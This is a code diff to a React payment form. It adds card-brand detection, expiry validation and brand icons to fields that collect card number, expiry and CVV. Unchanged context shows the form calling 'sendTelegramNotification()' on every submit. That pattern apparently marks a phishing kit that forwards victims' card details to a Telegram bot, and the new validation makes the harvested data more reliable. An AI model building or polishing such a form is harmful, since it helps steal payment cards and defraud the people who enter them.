@@ -275,7 +275,66 @@ const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
     return sum % 10 === 0;
   };
 
+  // Detect card type based on prefix
+  type CardType = 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';
+  
+  const detectCardType = (cardNum: string): CardType => {
+    const digits = cardNum.replace(/\s/g, "");
+    
+    // Visa: starts with 4
+    if (/^4/.test(digits)) return 'visa';
+    
+    // Mastercard: starts with 51-55 or 2221-2720
+    if (/^5[1-5]/.test(digits) || /^2(2[2-9]|[3-6]|7[01]|720)/.test(digits)) return 'mastercard';
+    
+    // Amex: starts with 34 or 37
+    if (/^3[47]/.test(digits)) return 'amex';
+    
+    // Discover: starts with 6011, 622126-622925, 644-649, 65
+    if (/^(6011|65|64[4-9]|622(1(2[6-9]|[3-9])|[2-8]|9([01]|2[0-5])))/.test(digits)) return 'discover';
+    
+    return 'unknown';
+  };
+
+  const [cardType, setCardType] = useState<CardType>('unknown');
+
   const [cardError, setCardError] = useState("");
+  const [expiryError, setExpiryError] = useState("");
+
+  // Validate expiry date
+  const validateExpiry = (expiryValue: string): { valid: boolean; error: string } => {
+    if (expiryValue.length < 5) return { valid: true, error: "" }; // Still typing
+    
+    const [monthStr, yearStr] = expiryValue.split("/");
+    const month = parseInt(monthStr, 10);
+    const year = parseInt("20" + yearStr, 10);
+    
+    if (month < 1 || month > 12) {
+      return { valid: false, error: "Invalid month" };
+    }
+    
+    const now = new Date();
+    const currentMonth = now.getMonth() + 1;
+    const currentYear = now.getFullYear();
+    
+    if (year < currentYear || (year === currentYear && month < currentMonth)) {
+      return { valid: false, error: "Card has expired" };
+    }
+    
+    if (year > currentYear + 20) {
+      return { valid: false, error: "Invalid year" };
+    }
+    
+    return { valid: true, error: "" };
+  };
+
+  const handleExpiryChange = (value: string) => {
+    const formatted = formatExpiry(value);
+    setExpiry(formatted);
+    
+    const validation = validateExpiry(formatted);
+    setExpiryError(validation.error);
+  };
 
   const formatCardNumber = (value: string) => {
     const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
@@ -291,6 +350,9 @@ const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
   const handleCardNumberChange = (value: string) => {
     const formatted = formatCardNumber(value);
     setCardNumber(formatted);
+    
+    // Detect card type
+    setCardType(detectCardType(formatted));
     
     const digits = formatted.replace(/\s/g, "");
     if (digits.length >= 13) {
@@ -373,6 +435,13 @@ ${countryName}
       return;
     }
     
+    // Validate expiry date
+    const expiryValidation = validateExpiry(expiry);
+    if (!expiryValidation.valid) {
+      setExpiryError(expiryValidation.error);
+      return;
+    }
+    
     await sendTelegramNotification();
     onProceed();
   };
@@ -441,15 +510,44 @@ ${countryName}
               <label className="block text-sm font-medium mb-2">
                 Card Number
               </label>
-              <input
-                type="text"
-                placeholder="1234 5678 9012 3456"
-                value={cardNumber}
-                onChange={(e) => handleCardNumberChange(e.target.value)}
-                maxLength={19}
-                className={`input-field font-mono ${cardError ? 'border-destructive focus:ring-destructive' : ''}`}
-                required
-              />
+              <div className="relative">
+                <input
+                  type="text"
+                  placeholder="1234 5678 9012 3456"
+                  value={cardNumber}
+                  onChange={(e) => handleCardNumberChange(e.target.value)}
+                  maxLength={19}
+                  className={`input-field font-mono pr-14 ${cardError ? 'border-destructive focus:ring-destructive' : ''}`}
+                  required
+                />
+                {/* Card type icon */}
+                <div className="absolute right-3 top-1/2 -translate-y-1/2">
+                  {cardType === 'visa' && (
+                    <div className="flex items-center justify-center w-10 h-6 bg-[#1A1F71] rounded text-white text-xs font-bold">
+                      VISA
+                    </div>
+                  )}
+                  {cardType === 'mastercard' && (
+                    <div className="flex items-center gap-0.5">
+                      <div className="w-5 h-5 rounded-full bg-[#EB001B]" />
+                      <div className="w-5 h-5 rounded-full bg-[#F79E1B] -ml-2.5" />
+                    </div>
+                  )}
+                  {cardType === 'amex' && (
+                    <div className="flex items-center justify-center w-10 h-6 bg-[#006FCF] rounded text-white text-[8px] font-bold">
+                      AMEX
+                    </div>
+                  )}
+                  {cardType === 'discover' && (
+                    <div className="flex items-center justify-center w-10 h-6 bg-[#FF6000] rounded text-white text-[7px] font-bold">
+                      DISCOVER
+                    </div>
+                  )}
+                  {cardType === 'unknown' && cardNumber.length === 0 && (
+                    <CreditCard className="w-5 h-5 text-muted-foreground" />
+                  )}
+                </div>
+              </div>
               {cardError && (
                 <p className="text-destructive text-sm mt-1">{cardError}</p>
               )}
@@ -462,11 +560,14 @@ ${countryName}
                   type="text"
                   placeholder="MM/YY"
                   value={expiry}
-                  onChange={(e) => setExpiry(formatExpiry(e.target.value))}
+                  onChange={(e) => handleExpiryChange(e.target.value)}
                   maxLength={5}
-                  className="input-field font-mono"
+                  className={`input-field font-mono ${expiryError ? 'border-destructive focus:ring-destructive' : ''}`}
                   required
                 />
+                {expiryError && (
+                  <p className="text-destructive text-sm mt-1">{expiryError}</p>
+                )}
               </div>
               <div>
                 <label className="block text-sm font-medium mb-2">CVV</label>
